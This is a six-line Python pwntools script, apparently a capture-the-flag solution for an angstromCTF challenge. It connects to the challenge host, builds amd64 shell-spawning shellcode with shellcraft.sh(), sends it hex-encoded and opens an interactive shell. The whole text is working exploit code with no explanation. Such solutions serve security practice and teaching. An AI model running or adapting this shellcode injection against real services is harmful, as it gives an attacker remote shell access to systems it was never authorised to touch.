from pwn import *

context.arch = 'amd64'
p = remote('challs.actf.co', 31200)
p.sendlineafter(b'): ', bytes.hex(asm(shellcraft.sh())).encode())
p.interactive()
